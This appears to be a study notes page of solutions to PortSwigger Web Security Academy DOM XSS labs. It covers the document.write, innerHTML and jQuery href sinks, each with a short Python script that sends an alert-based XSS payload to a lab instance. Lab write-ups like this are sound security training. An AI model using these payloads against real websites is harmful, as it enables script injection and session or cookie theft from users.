# Portswigger

## XSS

### [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

#### Lab: DOM XSS in `document.write` sink using source `location.search`

_This lab contains a_ [_DOM-based cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/dom-based) _vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL._

_To solve this lab, perform a_ [_cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting) _attack that calls the `alert` function_

```python
import requests

url = "https://0a1e0067044d34a8c2a44bb8000700ed.web-security-academy.net"

session = requests.Session()

params = {
    "search" : f'"><svg/onload=alert(1)>'
}
r = session.get(url = url , params= params)

if "Congratulations, you solved the lab!" in r.text:
    print("solved")
```

#### Lab: DOM XSS in `innerHTML` sink using source `location.search`

_This lab contains a_ [_DOM-based cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/dom-based) _vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`._

_To solve this lab, perform a_ [_cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting) _attack that calls the `alert` function._

```python
import requests

url = "https://0a9900f9047f2860c1167170009f00d1.web-security-academy.net/"

session = requests.Session()

params = {
    "search" : f'<svg/onload=alert(1)>'
}
r = session.get(url = url , params= params)

if "Congratulations, you solved the lab!" in r.text:
    print("solved")
```

#### Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

_This lab contains a_ [_DOM-based cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/dom-based) _vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`._

_To solve this lab, make the "back" link alert `document.cookie`._[\
](https://twitter.com/share?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-jquery-href-attribute-sink\&text=Lab%3a+DOM+XSS+in+jQuery+anchor+href+attribute+sink+using+location.search+source+%7c+Web+Security+Academy%0A)

```python
import requests

url = "https://0a1300e80334a707c1d5865600da009e.web-security-academy.net"

session = requests.Session()

params = {
    "returnPath" : f'javascript:alert(1)'
}
r = session.get(url = url , params= params)

if "Congratulations, you solved the lab!" in r.text:
    print("solved")
```

#### Lab: DOM XSS in jQuery selector sink using a hashchange event

_This lab contains a_ [_DOM-based cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/dom-based) _vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property._

_To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser._

![](<.gitbook/assets/image (2).png>)

